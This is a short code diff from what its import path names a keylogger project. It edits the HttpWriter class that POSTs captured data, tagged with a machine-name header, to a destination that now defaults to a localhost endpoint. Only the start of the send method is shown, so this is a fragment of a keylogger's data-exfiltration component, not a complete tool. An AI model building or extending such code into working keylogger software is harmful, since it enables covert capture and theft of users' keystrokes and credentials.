@@ -3,7 +3,7 @@ import requests
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 
-from keylogger.writers.base import IWriter
+from writers.base import IWriter
 
 
 
@@ -15,7 +15,7 @@ BACKOFF_FACTOR: float = 0.3
 
 class HttpWriter(IWriter):
 
-    def __init__(self, destination, timeout: float = 10.0) -> None:
+    def __init__(self, destination = "http://127.0.0.1:5000/update", timeout: float = 10.0) -> None:
         super().__init__(destination)
 
         self.__timeout = timeout
@@ -37,7 +37,7 @@ class HttpWriter(IWriter):
         self.session.mount("https://", adapter)
 
 
-    def send_data(self, data: Dict[str, Any], machine_name: str):
+    def send_data(self, data: Dict[str, Any], machine_name: str = "bla"):
         req_headers = {"X-Machine-Name": machine_name}
         try:
             resp = self.session.post(
